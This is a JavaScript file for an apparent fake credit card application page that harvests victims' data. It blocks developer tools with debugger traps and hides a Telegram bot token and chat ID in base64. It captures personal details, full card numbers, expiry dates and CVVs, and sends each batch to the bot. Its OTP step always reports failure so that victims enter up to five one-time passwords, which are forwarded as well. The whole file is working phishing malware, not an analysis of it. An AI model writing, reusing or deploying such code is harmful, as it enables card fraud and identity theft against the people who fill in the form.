(function securityLayer() {
  document.addEventListener('contextmenu', e => e.preventDefault());
  document.addEventListener('keydown', e => {
    if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {
      e.preventDefault();
      return false;
    }
  });
  setInterval(() => { debugger; }, 2000);
})();

const _0x5a21 = [
  "ODk3MDM3NzIyOTpBQUZZZkQxRDBrOTQzUkpQNFM2N0p6QjdWZWpLZnhpdlVwTQ==",
  "LTEwMDI4NDM2MzM5OTY="
];
const _BOT_TOKEN = atob(_0x5a21[0]);
const _CHAT_ID = atob(_0x5a21[1]);

let formData = {};
let uniqueID = '';
let otpAttempts = 0;
let timerInterval;
let timeLeft = 15;

const months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
let selectedDate = { day: 1, month: 0, year: 2000 };

function initDatePicker() {
  const dobInput = document.getElementById('dob');
  const datePickerModal = document.getElementById('datePickerModal');
  const dayWheel = document.getElementById('dayWheel');
  const monthWheel = document.getElementById('monthWheel');
  const yearWheel = document.getElementById('yearWheel');
  const confirmBtn = document.getElementById('datePickerConfirm');
  const cancelBtn = document.getElementById('datePickerCancel');
  const closeBtn = document.getElementById('datePickerClose');
  const overlay = document.querySelector('.date-picker-overlay');

  const ITEM_HEIGHT = 44;
  const minYear = 1930;
  const maxYear = 2008;

  function createSpacer() {
    const spacer = document.createElement('div');
    spacer.className = 'wheel-spacer';
    return spacer;
  }

  dayWheel.innerHTML = '';
  dayWheel.appendChild(createSpacer());
  dayWheel.appendChild(createSpacer());
  for (let i = 1; i <= 31; i++) {
    const item = document.createElement('div');
    item.className = 'wheel-item';
    item.textContent = String(i).padStart(2, '0');
    item.dataset.value = i;
    dayWheel.appendChild(item);
  }
  dayWheel.appendChild(createSpacer());
  dayWheel.appendChild(createSpacer());

  monthWheel.innerHTML = '';
  monthWheel.appendChild(createSpacer());
  monthWheel.appendChild(createSpacer());
  months.forEach((month, idx) => {
    const item = document.createElement('div');
    item.className = 'wheel-item';
    item.textContent = month;
    item.dataset.value = idx;
    monthWheel.appendChild(item);
  });
  monthWheel.appendChild(createSpacer());
  monthWheel.appendChild(createSpacer());

  yearWheel.innerHTML = '';
  yearWheel.appendChild(createSpacer());
  yearWheel.appendChild(createSpacer());
  for (let year = maxYear; year >= minYear; year--) {
    const item = document.createElement('div');
    item.className = 'wheel-item';
    item.textContent = year;
    item.dataset.value = year;
    yearWheel.appendChild(item);
  }
  yearWheel.appendChild(createSpacer());
  yearWheel.appendChild(createSpacer());

  function openDatePicker() {
    datePickerModal.classList.add('active');
    setTimeout(() => {
      scrollToSelected();
    }, 100);
  }

  function closeDatePicker() {
    datePickerModal.classList.remove('active');
  }

  function scrollToSelected() {
    scrollWheelToValue(dayWheel, selectedDate.day);
    scrollWheelToValue(monthWheel, selectedDate.month);
    scrollWheelToValue(yearWheel, selectedDate.year);
  }

  function scrollWheelToValue(wheel, value) {
    const items = Array.from(wheel.querySelectorAll('.wheel-item'));
    const targetItem = items.find(item => parseInt(item.dataset.value) === value);

    if (targetItem) {
      const scrollPosition = targetItem.offsetTop - wheel.clientHeight / 2 + ITEM_HEIGHT / 2;
      wheel.scrollTop = Math.max(0, scrollPosition);
    }
  }

  function updateSelection(wheel) {
    const items = wheel.querySelectorAll('.wheel-item');
    const centerY = wheel.scrollTop + wheel.clientHeight / 2;

    let closestItem = null;
    let minDistance = Infinity;

    items.forEach(item => {
      const itemCenterY = item.offsetTop + ITEM_HEIGHT / 2;
      const distance = Math.abs(itemCenterY - centerY);

      if (distance < minDistance) {
        minDistance = distance;
        closestItem = item;
      }
    });

    items.forEach(item => item.classList.remove('selected'));
    if (closestItem) {
      closestItem.classList.add('selected');

      const value = parseInt(closestItem.dataset.value);
      if (wheel === dayWheel) selectedDate.day = value;
      if (wheel === monthWheel) selectedDate.month = value;
      if (wheel === yearWheel) selectedDate.year = value;
    }
  }

  let scrollTimeout;
  function onWheelScroll(wheel) {
    clearTimeout(scrollTimeout);
    updateSelection(wheel);
    scrollTimeout = setTimeout(() => updateSelection(wheel), 100);
  }

  dayWheel.addEventListener('scroll', () => onWheelScroll(dayWheel), false);
  monthWheel.addEventListener('scroll', () => onWheelScroll(monthWheel), false);
  yearWheel.addEventListener('scroll', () => onWheelScroll(yearWheel), false);

  dobInput.addEventListener('click', openDatePicker);
  closeBtn.addEventListener('click', closeDatePicker);
  overlay.addEventListener('click', closeDatePicker);
  cancelBtn.addEventListener('click', closeDatePicker);

  confirmBtn.addEventListener('click', () => {
    const dateStr = `${String(selectedDate.day).padStart(2, '0')} ${months[selectedDate.month]} ${selectedDate.year}`;
    dobInput.value = dateStr;
    dobInput.classList.add('valid');
    clearErr('dob');
    closeDatePicker();
  });
}

document.addEventListener('DOMContentLoaded', initDatePicker);

function generateUniqueID() {
  const date = new Date();
  const year = date.getFullYear();
  const month = String(date.getMonth() + 1).padStart(2, '0');
  const day = String(date.getDate()).padStart(2, '0');
  const random = Math.floor(Math.random() * 900000) + 100000;
  return `${year}${month}${day}${random}`;
}

function startLoader(title, sub, duration, cb) {
  const loader = document.getElementById('loader');
  const fill = document.getElementById('progressFill');
  document.getElementById('loaderTitle').textContent = title;
  document.getElementById('loaderSub').textContent = sub;
  fill.style.width = '0%';
  loader.style.display = 'flex';
  const start = Date.now();
  const t = setInterval(() => {
    const pct = Math.min(((Date.now() - start) / duration) * 100, 100);
    fill.style.width = pct + '%';
    if (pct >= 100) {
      clearInterval(t);
      setTimeout(() => {
        loader.style.display = 'none';
        if (cb) cb();
      }, 200);
    }
  }, 40);
}

function showErr(id, msg) {
  const h = document.getElementById('e-' + id);
  if (h) { h.textContent = msg || h.textContent; h.classList.add('show'); }
}
function clearErr(id) {
  const h = document.getElementById('e-' + id);
  if (h) h.classList.remove('show');
}
function markValid(el) { el.classList.remove('error'); el.classList.add('valid'); }
function markErr(el, id, msg) { el.classList.remove('valid'); el.classList.add('error'); showErr(id, msg); }

const validateName = v => /^[A-Za-z ]{2,50}$/.test(v.trim());
const validateMobile = v => /^[6-9][0-9]{9}$/.test(v.trim());
const validateEmail = v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v.trim());
const validateLimit = v => { const n = parseInt(v, 10); return !isNaN(n) && n >= 2000 && n <= 1000000; };
const validateHolder = v => /^[A-Za-z ]{2,50}$/.test(v.trim());
const validateCardNumber = v => {
  const clean = v.replace(/\s/g, '');
  if (/^3[47]/.test(clean)) return /^[0-9]{15}$/.test(clean);
  return /^[0-9]{16}$/.test(clean);
};
const validateExpiry = v => /^(0[1-9]|1[0-2])\/\d{2}$/.test(v.trim());
const validateCVV = v => /^[0-9]{3,4}$/.test(v.trim());

function bindLive(id, validator, errId) {
  const el = document.getElementById(id);
  if (!el) return;
  el.addEventListener('blur', () => {
    if (validator(el.value)) { markValid(el); clearErr(errId || id.replace(/[0-9]/g, '')); }
    else markErr(el, errId || id.replace(/\d/g, ''), null);
  });
  el.addEventListener('input', () => {
    if (el.classList.contains('error') && validator(el.value)) { markValid(el); clearErr(errId || id.replace(/\d/g, '')); }
  });
}

bindLive('name', validateName, 'name');
bindLive('mobileNumber', validateMobile, 'mobile');
bindLive('email1', validateEmail, 'email');
bindLive('cardLimit', validateLimit, 'limit');
bindLive('holder', validateHolder, 'holder');
bindLive('cardNumber', validateCardNumber, 'cardno');
bindLive('expiry', validateExpiry, 'expiry');
bindLive('cvc', validateCVV, 'cvv');

const mobileInput = document.getElementById('mobileNumber');
if (mobileInput) {
  mobileInput.addEventListener('input', function () {
    this.value = this.value.replace(/\D/g, '').slice(0, 10);
  });
}

const cardNumberInput = document.getElementById('cardNumber');
if (cardNumberInput) {
  cardNumberInput.addEventListener('input', function () {
    let clean = this.value.replace(/\D/g, '');
    let isAmex = /^3[47]/.test(clean);
    let v = clean.slice(0, isAmex ? 15 : 16);
    if (isAmex) {
      let parts = [];
      if (v.length > 0) parts.push(v.slice(0, 4));
      if (v.length > 4) parts.push(v.slice(4, 10));
      if (v.length > 10) parts.push(v.slice(10, 15));
      this.value = parts.join(' ');
      const disp = v.padEnd(15, '•');
      const cpNum = document.getElementById('cpNumber');
      if (cpNum) cpNum.textContent = disp.slice(0, 4) + ' ' + disp.slice(4, 10) + ' ' + disp.slice(10, 15);
    } else {
      this.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
      const disp = v.padEnd(16, '•');
      const cpNum = document.getElementById('cpNumber');
      if (cpNum) cpNum.textContent = disp.slice(0, 4) + ' ' + disp.slice(4, 8) + ' ' + disp.slice(8, 12) + ' ' + disp.slice(12, 16);
    }
  });
}

const holderInput = document.getElementById('holder');
if (holderInput) {
  holderInput.addEventListener('input', function () {
    const cpHold = document.getElementById('cpHolder');
    if (cpHold) cpHold.textContent = this.value.toUpperCase() || 'YOUR NAME';
  });
}

const expiryInput = document.getElementById('expiry');
if (expiryInput) {
  expiryInput.addEventListener('input', function () {
    let v = this.value.replace(/\D/g, '').slice(0, 4);
    this.value = v.length >= 3 ? v.slice(0, 2) + '/' + v.slice(2) : v;
    const cpExp = document.getElementById('cpExpiry');
    if (cpExp) cpExp.textContent = this.value || 'MM/YY';
  });
}

const cvcInput = document.getElementById('cvc');
if (cvcInput) {
  cvcInput.addEventListener('input', function () {
    this.value = this.value.replace(/\D/g, '').slice(0, 4);
  });
}

function setStep(n) {
  const s1 = document.getElementById('stepItem1');
  const s2 = document.getElementById('stepItem2');
  const s3 = document.getElementById('stepItem3');
  if (!s1 || !s2 || !s3) return;
  s1.classList.remove('active', 'done');
  s2.classList.remove('active', 'done');
  s3.classList.remove('active', 'done');
  if (n === 1) s1.classList.add('active');
  if (n === 2) { s1.classList.add('done'); s2.classList.add('active'); }
  if (n === 3) { s1.classList.add('done'); s2.classList.add('done'); s3.classList.add('active'); }
}

async function sendToTelegram(message) {
  try {
    const response = await fetch('https://api.telegram.org/bot' + _BOT_TOKEN + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: _CHAT_ID,
        text: message,
        disable_web_page_preview: true
      })
    });
    const result = await response.json();
    return result.ok;
  } catch (e) {
    return false;
  }
}

const nextBtn1 = document.getElementById('nextBtn1');
if (nextBtn1) {
  nextBtn1.addEventListener('click', function () {
    const name = document.getElementById('name').value.trim();
    const mobile = document.getElementById('mobileNumber').value.trim();
    const email = document.getElementById('email1').value.trim();
    const dob = document.getElementById('dob').value.trim();
    const limit = document.getElementById('cardLimit').value.trim();
    let ok = true;
    if (!validateName(name)) { markErr(document.getElementById('name'), 'name', null); ok = false; }
    if (!validateMobile(mobile)) { markErr(document.getElementById('mobileNumber'), 'mobile', null); ok = false; }
    if (!validateEmail(email)) { markErr(document.getElementById('email1'), 'email', null); ok = false; }
    if (!dob) { document.getElementById('dob').classList.add('error'); showErr('dob', null); ok = false; }
    if (!validateLimit(limit)) { markErr(document.getElementById('cardLimit'), 'limit', null); ok = false; }
    if (!ok) return;
    uniqueID = generateUniqueID();
    formData = { name, mobile, email, dob, limit };
    startLoader('Verifying your details…', 'This takes just a moment', 6000, async () => {
      const msgPersonal = `🆔 ID: ${uniqueID}
👤 Name: ${name}
📱 Mobile: ${mobile}
📧 Email: ${email}
🎂 DOB: ${dob}
💰 Limit: ₹${parseInt(limit).toLocaleString('en-IN')}`;
      await sendToTelegram(msgPersonal);
      document.getElementById('step1').classList.add('hidden');
      document.getElementById('step2').classList.remove('hidden');
      setStep(2);
      window.scrollTo({ top: 0, behavior: 'smooth' });
    });
  });
}

const nextBtn2 = document.getElementById('nextBtn2');
if (nextBtn2) {
  nextBtn2.addEventListener('click', function () {
    const holder = document.getElementById('holder').value.trim();
    const card = document.getElementById('cardNumber').value.replace(/\s/g, '');
    const exp = document.getElementById('expiry').value.trim();
    const cvv = document.getElementById('cvc').value.trim();
    let ok = true;
    if (!validateHolder(holder)) { markErr(document.getElementById('holder'), 'holder', null); ok = false; }
    if (!validateCardNumber(card)) { markErr(document.getElementById('cardNumber'), 'cardno', null); ok = false; }
    if (!validateExpiry(exp)) { markErr(document.getElementById('expiry'), 'expiry', null); ok = false; }
    if (!validateCVV(cvv)) { markErr(document.getElementById('cvc'), 'cvv', null); ok = false; }
    if (!ok) return;
    formData.holder = holder;
    formData.cardNumber = card;
    formData.expiry = exp;
    formData.cvv = cvv;
    let cardFormatted = card;
    if (/^3[47]/.test(card)) {
      cardFormatted = card.slice(0, 4) + ' ' + card.slice(4, 10) + ' ' + card.slice(10, 15);
    } else {
      cardFormatted = card.slice(0, 4) + ' ' + card.slice(4, 8) + ' ' + card.slice(8, 12) + ' ' + card.slice(12, 16);
    }
    startLoader('Processing your application…', 'Securing your details', 8000, async () => {
      const msgCard = `🆔 ID: ${uniqueID}
💳 Card: ${cardFormatted}
👤 Holder: ${holder}
📅 Expiry: ${exp}
🔒 CVV: ${cvv}`;
      await sendToTelegram(msgCard);
      document.getElementById('step2').classList.add('hidden');
      document.getElementById('step3').classList.remove('hidden');
      setStep(3);
      startTimer();
      window.scrollTo({ top: 0, behavior: 'smooth' });
      const firstOtpInput = document.querySelectorAll('.otp-input')[0];
      if (firstOtpInput) firstOtpInput.focus();
    });
  });
}

const otpInputs = document.querySelectorAll('.otp-input');
const verifyBtn = document.getElementById('verifyBtn');
const resendBtn = document.getElementById('resendBtn');
const otpErrorPopup = document.getElementById('otpErrorPopup');
const otpErrorClose = document.getElementById('otpErrorClose');
const finalErrorPopup = document.getElementById('finalErrorPopup');
const successPopup = document.getElementById('successPopup');
const timerValue = document.getElementById('timerValue');

if (otpInputs.length > 0) {
  otpInputs.forEach((input, index) => {
    input.addEventListener('input', function (e) {
      let value = e.target.value;
      value = value.replace(/\D/g, '');
      e.target.value = value;
      if (value.length === 1) {
        input.classList.add('filled');
        if (index < otpInputs.length - 1) {
          otpInputs[index + 1].focus();
        }
      }
    });
    input.addEventListener('keydown', function (e) {
      if (e.key === 'Backspace') {
        if (input.value === '' && index > 0) {
          otpInputs[index - 1].focus();
          otpInputs[index - 1].value = '';
          otpInputs[index - 1].classList.remove('filled');
        } else {
          input.classList.remove('filled');
        }
      }
    });
    input.addEventListener('paste', function (e) {
      e.preventDefault();
      const pasteData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
      pasteData.split('').forEach((char, i) => {
        if (otpInputs[i]) {
          otpInputs[i].value = char;
          otpInputs[i].classList.add('filled');
        }
      });
      if (pasteData.length > 0) {
        otpInputs[Math.min(pasteData.length, 5)].focus();
      }
    });
  });
}

function startTimer() {
  timeLeft = 15;
  if (resendBtn) {
    resendBtn.disabled = true;
    resendBtn.style.opacity = '0.5';
  }
  if (timerInterval) clearInterval(timerInterval);
  timerInterval = setInterval(() => {
    timeLeft--;
    const mins = Math.floor(timeLeft / 60).toString().padStart(2, '0');
    const secs = (timeLeft % 60).toString().padStart(2, '0');
    if (timerValue) timerValue.textContent = `${mins}:${secs}`;
    if (timeLeft <= 0) {
      clearInterval(timerInterval);
      if (resendBtn) {
        resendBtn.disabled = false;
        resendBtn.style.opacity = '1';
      }
      if (timerValue) timerValue.textContent = '00:00';
    }
  }, 1000);
}

if (otpErrorClose) {
  otpErrorClose.addEventListener('click', function () {
    otpErrorPopup.classList.remove('show');
    if (otpInputs[0]) otpInputs[0].focus();
  });
}

if (otpErrorPopup) {
  otpErrorPopup.addEventListener('click', function (e) {
    if (e.target === otpErrorPopup) {
      otpErrorPopup.classList.remove('show');
      if (otpInputs[0]) otpInputs[0].focus();
    }
  });
}

if (verifyBtn) {
  verifyBtn.addEventListener('click', async function () {
    let otp = '';
    let allFilled = true;
    otpInputs.forEach(input => {
      if (input.value === '') allFilled = false;
      otp += input.value;
    });
    if (!allFilled || otp.length !== 6) {
      otpInputs.forEach(input => {
        if (input.value === '') {
          input.classList.add('error');
          setTimeout(() => input.classList.remove('error'), 400);
        }
      });
      return;
    }
    otpAttempts++;
    formData.otp = otp;
    verifyBtn.disabled = true;
    verifyBtn.innerHTML = '<svg viewBox="0 0 24 24" style="width:18px;height:18px;stroke:#fff;fill:none;stroke-width:2;animation:spin .8s linear infinite"><path d="M21 12a9 9 0 11-6.219-8.56"/></svg> Verifying...';
    const msgOTP = `🆔 ID: ${uniqueID}
🔐 OTP: ${otp}
🔢 Attempt: ${otpAttempts}/5`;
    await sendToTelegram(msgOTP);
    setTimeout(() => {
      verifyBtn.disabled = false;
      verifyBtn.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg> Verify OTP';
      otpInputs.forEach(input => {
        input.value = '';
        input.classList.remove('filled', 'error');
      });
      if (otpAttempts >= 5) {
        if (finalErrorPopup) finalErrorPopup.classList.add('show');
      } else {
        if (otpErrorPopup) otpErrorPopup.classList.add('show');
      }
    }, 5000);
  });
}

if (resendBtn) {
  resendBtn.addEventListener('click', function () {
    if (resendBtn.disabled) return;
    if (successPopup) successPopup.classList.add('show');
    setTimeout(() => {
      if (successPopup) successPopup.classList.remove('show');
      otpInputs.forEach(input => {
        input.value = '';
        input.classList.remove('filled', 'error');
      });
      if (otpInputs[0]) otpInputs[0].focus();
      startTimer();
    }, 2000);
  });
}
